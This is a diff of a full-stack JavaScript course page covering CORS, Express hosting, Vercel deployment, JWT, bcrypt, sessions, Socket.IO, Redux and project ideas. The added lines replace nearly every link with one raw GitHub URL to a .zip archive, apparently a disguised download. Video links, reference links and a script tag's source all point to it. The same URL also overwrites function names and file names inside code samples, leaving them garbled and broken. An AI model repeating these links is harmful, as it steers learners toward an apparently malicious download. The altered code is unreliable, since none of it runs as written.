-  CORS - [Cross-Origin Resource Sharing](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) ([CORS](https://developer.mozilla.org/en-US/docs/Glossary/CORS)) is a standard that allows a server to relax the [same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy) 
+  CORS - [Cross-Origin Resource Sharing](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip) ([CORS](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)) is a standard that allows a server to relax the [same-origin policy](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip) 
 
 - we  will use CORS package to allow cross origin request from **React JS** server to **NodeJS** server  as they are on different hosts.
 - `npm install cors`
@@ -1423,7 +1423,7 @@ Queries in Mongoose : [Link](https://mongoosejs.com/docs/queries.html)
 ```javascript
 const cors = require('cors');
 
-server.use(cors())
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(cors())
 ```
 **HTML Forms**
 
@@ -1436,14 +1436,14 @@ server.use(cors())
 ### Host a React Project :
 
 you can use `build` folder of react and add it to static hosting of express.
-`server.use(express.static('build'));`
+`https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip('build'));`
 
 ### Use Routing in Front-end
 
-use wildcard in express route to point to React single page applications (index.html)
+use wildcard in express route to point to React single page applications (https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
 ```javascript
-res.sendFile(path.resolve(__dirname,'build','index.html'))
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(__dirname,'build','https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip'))
 ```
 `__dirname` is a variable
 
@@ -1464,22 +1464,22 @@ res.sendFile(path.resolve(__dirname,'build','index.html'))
 ### How to Deploy to Vercel :
 - Commit you code on a github account (personal account for free services)
 - Set Environment Variables on Vercel - like MONGO_URL, PUBLIC_DIR
-- Put a vercel config file - `vercel.json` in your project root directory.
+- Put a vercel config file - `https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip` in your project root directory.
 -  After every change, commit your changes - and push code on github.
-- You have to provide permission for github directory to vercel. It will pickup `vercel.json` and `package.json` and deploy your code accordingly.
+- You have to provide permission for github directory to vercel. It will pickup `https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip` and `https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip` and deploy your code accordingly.
 - Check video for more details.
 
   
 ###  [[ Assignments ]]
   
 - **Assignment 1** : Deploy your own application or API only to a live server like `Vercel`
-- **Assignment 2 [Challenge]** : Deploy your own application or API only to a live server  `Railway.app`
+- **Assignment 2 [Challenge]** : Deploy your own application or API only to a live server  `https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip`
 
 
 ### Related Links/Videos
 
-1. [Heroku Deployment Video](https://www.youtube.com/watch?v=GeXA_MzMR6I)
-2. [Git Crash Course](https://youtu.be/kviiFelh28g)
+1. [Heroku Deployment Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
+2. [Git Crash Course](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
 
 
@@ -1503,7 +1503,7 @@ Install
 
 ```pug
 <% if (product) { %>
- <h2><%= product.title %></h2>
+ <h2><%= https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip %></h2>
 <% } %>
 ```
 
@@ -1514,8 +1514,8 @@ For passing variable to template engine and render a new page :
 const ejs = require('ejs');
 
 
-ejs.renderFile(path.resolve(__dirname,'../pages/index.ejs'), {products:products}, function(err, str){
-    res.send(str); // this is the rendered HTML
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(__dirname,'https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip'), {products:products}, function(err, str){
+    https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(str); // this is the rendered HTML
 });
 ```
 
@@ -1535,7 +1535,7 @@ ejs.renderFile(path.resolve(__dirname,'../pages/index.ejs'), {products:products}
 
 ### Related Links/Videos
 
-1. [DOM Series](https://bit.ly/35nMKB7)
+1. [DOM Series](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
 ## Chapter 11 - Authentication  with JWT 
 
@@ -1543,13 +1543,13 @@ ejs.renderFile(path.resolve(__dirname,'../pages/index.ejs'), {products:products}
 
 #### JWT library installation
 		`npm install jsonwebtoken`
-- Use jwt.io to understand 3 parts of JWT - headers, payload, signature
+- Use https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip to understand 3 parts of JWT - headers, payload, signature
 
  #### Signing of JWT
-`jwt.sign(payload, secret)` this returns a **token**
+`https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(payload, secret)` this returns a **token**
 
 #### verifying a JWT token
-`jwt.verify(token, secret)` this returns decoded value of **payload**
+`https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(token, secret)` this returns decoded value of **payload**
 
 We will use HTTP Authorization headers for exchanging these tokens
 e.g. `Authorization = 'Bearer JWT_TOKEN_VALUE'`
@@ -1566,11 +1566,11 @@ you can use a library like `bcrypt` to hash password, so they are not stored in 
 
 #### Hashing
 
-```bcrypt.hashSync(userProvidedPassword, saltRounds)```
+```https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(userProvidedPassword, saltRounds)```
  
 #### Verifying Password
 
-`bcrypt.compareSync(loginPassword, AlreadyHashedPassword)`
+`https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(loginPassword, AlreadyHashedPassword)`
 
 return `true` of `false` based on verification of password	
 
@@ -1582,13 +1582,13 @@ return `true` of `false` based on verification of password
 
 ### Related Links/Videos
 
-1. [Localstorage](https://youtu.be/OTkQVPVYW7w)
+1. [Localstorage](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
 
 
 #### SESSION MIDDLEWARE [Optional]
 
-[Check Video on Session](https://www.youtube.com/watch?v=v_Ewns3n_Ow) : 
+[Check Video on Session](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip) : 
 
 Session middleware is used to store session variable for each user on server side. This middleware can make use of any data storage depending on settings. By default it stores session variables in Memory (RAM).
 
@@ -1605,7 +1605,7 @@ var server = express()
 const session = require('express-session')
 
 
-server.use(session({
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(session({
   secret: 'keyboard cat',
   resave: false,
   saveUninitialized: true,
@@ -1614,17 +1614,17 @@ server.use(session({
 
 ```
 
-Now you can use `req.session` object to store any value for a particular user in server session. This value will not interact with similar variable of other users.
+Now you can use `https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip` object to store any value for a particular user in server session. This value will not interact with similar variable of other users.
 
 ```js
 
-server.get('/user', function(req, res) {
-  if (req.session.views) {
-    req.session.views++
-    res.json({views:req.session.views})
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip('/user', function(req, res) {
+  if (https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip) {
+    https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip++
+    https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip({https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip})
   } else {
-    req.session.views = 1
-    res.send('welcome to the session demo. refresh!')
+    https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip = 1
+    https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip('welcome to the session demo. refresh!')
   }
 })
 
@@ -1642,7 +1642,7 @@ In above example we are initializing a variable session for each user. Write sim
 
 #### More Interesting ways of Authentication :
 
-- [Passport JS Authentication](https://www.youtube.com/watch?v=U-S3rgG8hBE)
+- [Passport JS Authentication](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
 
 
@@ -1668,15 +1668,15 @@ Populate() lets you reference documents in other collections.
 const  userSchema  =  new  Schema({
 firstName: { type:  String, required:  true },
 lastName:  String,
-cart:[{ type:  Schema.Types.ObjectId, ref:  'Product' }],
+cart:[{ type:  https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip, ref:  'Product' }],
 email: {
     type:  String,
     unique:  true,
     validate: {
        validator:  function (v) {
-        return /^[\w-\.]+@([\w-]+\.)+[\w-]{2,4}$/.test(v);
+        return /^[\w-\.]+@([\w-]+\.)+[\w-]{2,4}$https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(v);
           },
-       message: (props) =>  `${props.value} is not a valid email!`,
+       message: (props) =>  `${https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip} is not a valid email!`,
      },
     required:  true,
 },
@@ -1685,11 +1685,11 @@ token:  String,
 });
 
 //cart populated example
-const  user  =  await  User.findById(id).populate('cart');
+const  user  =  await  https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(id).populate('cart');
 
 ```
 **For More details :**
-[Detailed Population Video](https://youtu.be/VuSt5-AwL8Y)
+[Detailed Population Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
 
 
@@ -1698,9 +1698,9 @@ const  user  =  await  User.findById(id).populate('cart');
 ```javascript
 const em = new EventEmitter()
 
-em.on(eventName, (payloadData)=>{} ) // listeners
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(eventName, (payloadData)=>{} ) // listeners
 
-em.emit( eventName , payloadData ) // emit events
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip( eventName , payloadData ) // emit events
 ```
 
 #### Node Streams
@@ -1708,40 +1708,40 @@ em.emit( eventName , payloadData ) // emit events
 A readable stream
 
 ```javascript
-const  rr  =  fs.createReadStream('./data.json');
+const  rr  =  https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip('https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip');
 
-rr.on('data', (data) => { // received data event on every file read
- console.log({data});
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip('data', (data) => { // received data event on every file read
+ https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip({data});
 });
 
-rr.on('end', (data) => {  // received end of stream event
- console.log({data});
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip('end', (data) => {  // received end of stream event
+ https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip({data});
 });
 ```
 
-### Socket in Node (Socket.IO)
+### Socket in Node (https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
 #### Install Socket IO library
 
-```npm install socket.io```
+```npm install https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip```
 
 #### Server Side Code
 
 ```javascript
 const  server  =  express();
 const  app  =  require('http').createServer(server);
-const  io  =  require('socket.io')(app);
+const  io  =  require('https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip')(app);
 
-io.on('connection', (socket) => {
-console.log('socket',socket.id)
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip('connection', (socket) => {
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip('socket',https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
-socket.on('msg',(data)=>{ // listener to client-side events 'msg'
-console.log({data})
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip('msg',(data)=>{ // listener to client-side events 'msg'
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip({data})
 })
-socket.emit('serverMsg',{server:'hi'} //emitting 'serverMsg' for Client-side
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip('serverMsg',{server:'hi'} //emitting 'serverMsg' for Client-side
 });
 
-app.listen(port)
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip(port)
 
 ```
 
@@ -1749,30 +1749,30 @@ app.listen(port)
 
 ```html
 // embeding client-side library which will be downloaded from module installed on Server
-<script  src="/socket.io/socket.io.js"></script>
+<script  src="https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip"></script>
 
 <script>
 const  socket  =  io();
-console.log('socket',socket.id)
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip('socket',https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
-socket.emit('msg',{player:'one'}) // emitting 'msg' to server-side
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip('msg',{player:'one'}) // emitting 'msg' to server-side
 
-socket.on('serverMsg',(data)=>{  // listener to server-side events 'serverMsg'
-   console.log({data});
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip('serverMsg',(data)=>{  // listener to server-side events 'serverMsg'
+   https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip({data});
 })
 
 </script>
 ```
 
 ### Uploading a file on NodeJS
-- [Uploading a file using Multer middleware Video](https://www.youtube.com/watch?v=qfN6c5FEAQQ)
+- [Uploading a file using Multer middleware Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
 
 
 ###  [[ Assignments ]]
   
 - **Assignment 1** :
-  -  Make a **simple group chat application** using **Socket.io** library. 
+  -  Make a **simple group chat application** using **https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip** library. 
   - You need to have a user enter their name in textbox  (you can store that in localstorage)
   -  After user enters the name : they can see a text box where they can start entering the text messages. 
   - Display messages from user and others in a simple html list format. 
@@ -2003,7 +2003,7 @@ will only be visible after approved by admin.
 
 Refer to this URL 
 
-https://zapier.com/blog/best-pomodoro-apps/
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip
 
 ## 13. Popular content search engine and pinboard
 
@@ -2119,7 +2119,7 @@ When you visit a restaurant you have to book a table for people. If you book in 
 ## 22. Currency Converter App
 
 - Show a list of top currencies and countries sorted by their value for today.
-- List of countries will be displayed with their flag icons. [Example UI Link](https://play.google.com/store/apps/details?id=com.easy.currency.extra.androary&hl=en)
+- List of countries will be displayed with their flag icons. [Example UI Link](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 - There should be two input "Current Currency" and "Exchange Currency". e.g Current Currecy as "INR" and Exchange Currency as "USD".
 - Automatic conversion should be done on change of any change in Dropdown menus.
 - You can reverse the currency options by simple click.
@@ -2165,7 +2165,7 @@ Make an advanced interface for creating memes! Allow the user to upload an image
 
 ## 26. Tetris Game
 
-Example : [Check this](https://github.com/skidding/flatris)
+Example : [Check this](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
 
 ## 27. Break Journey App
@@ -2235,18 +2235,18 @@ Hi, This is course page of **CoderDost Youtube Channel** Redux JS 2023 Course [V
 
   
 
-- **Assignment 1** : Using the concepts learnt in this chapter. Make a Async type of call from a new reducer to any online API like [JSON Placeholder Posts](https://jsonplaceholder.typicode.com/posts). Also show proper loading messages in console.  Like - `loading posts...`, `posts loaded` , `posts fetching failed`. Also add those posts to a state of reducer in a sorted manner (sort by `title`)
+- **Assignment 1** : Using the concepts learnt in this chapter. Make a Async type of call from a new reducer to any online API like [JSON Placeholder Posts](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip). Also show proper loading messages in console.  Like - `loading posts...`, `posts loaded` , `posts fetching failed`. Also add those posts to a state of reducer in a sorted manner (sort by `title`)
 
-- **Assignment 2** : Check out IMMER library and run some example and see how you can make mutating updates like `state.amount++` inside reducer logic. And still it work perfectly in redux.
-[Immer Link](https://immerjs.github.io/immer/)
+- **Assignment 2** : Check out IMMER library and run some example and see how you can make mutating updates like `https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip++` inside reducer logic. And still it work perfectly in redux.
+[Immer Link](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
 ### Related Videos
-1. De-structuring Assignment : [Long Video](https://youtu.be/sNhqFofQhFs) |  [Object De-structure Short Video](https://youtube.com/shorts/H3MKXE69_c8) | [Array De-structure Short Video](https://youtube.com/shorts/ONGyMq49kZY)
-2. Import/Export :  [Long Video](https://youtu.be/7P5JUMc1cI4) |  [Short Video](https://youtube.com/shorts/sUUOSWlwfM8)
-3. Spread Operator : [Long Video](https://youtu.be/X4Iv0TBHDQ4) | [Short Video](https://youtube.com/shorts/5dBZGyXutx8)
-4. [Callbacks](https://youtu.be/rx-y7U4x4wc) 
-5. [Promises](https://youtu.be/aA4-VNZK2s0)
-6. [Async Await](https://youtu.be/rdy8ZV0LXV0)
+1. De-structuring Assignment : [Long Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip) |  [Object De-structure Short Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip) | [Array De-structure Short Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
+2. Import/Export :  [Long Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip) |  [Short Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
+3. Spread Operator : [Long Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip) | [Short Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
+4. [Callbacks](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip) 
+5. [Promises](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
+6. [Async Await](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
  
 
 
@@ -2254,11 +2254,11 @@ Hi, This is course page of **CoderDost Youtube Channel** Redux JS 2023 Course [V
 
 - **Assignment 1** : Add more cases in Account Reducer called `decrementByAmount` . Also check that amount should not be decremented in case `amount` to be decremented is less than account Balance. For e.g. if total amount in account is 10, you can't decrement by 11. Also show an error in that situation to user.
  
-- **Assignment 2** : Check out IMMER library and run some example and see how you can make mutating updates like `state.amount++` inside reducer logic. And still it work perfectly in redux.
-[Immer Link](https://immerjs.github.io/immer/)
+- **Assignment 2** : Check out IMMER library and run some example and see how you can make mutating updates like `https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip++` inside reducer logic. And still it work perfectly in redux.
+[Immer Link](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
 ### Related Videos
-1. [React-Redux in Class Components](https://youtu.be/FIjtWnypwMo)
+1. [React-Redux in Class Components](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
 
 ## Chapter 3 - Redux Toolkit with React
@@ -2272,8 +2272,8 @@ Hi, This is course page of **CoderDost Youtube Channel** Redux JS 2023 Course [V
 	  - You can put a `selected` button on end of list item. On clicking of this button `user` list item will change colors. [Hint: use REST API concepts Update API, PUT/PATCH method]
 	  - 
 ### Related Videos
-1. [ REST API concepts](https://youtu.be/xrB51fPM1K4)
-2. [REST API complete explanation in NodeJS](https://youtu.be/ChVE-JbtYbM?t=10913)
+1. [ REST API concepts](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
+2. [REST API complete explanation in NodeJS](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
 
 ## Chapter 4 - Redux Toolkit Query
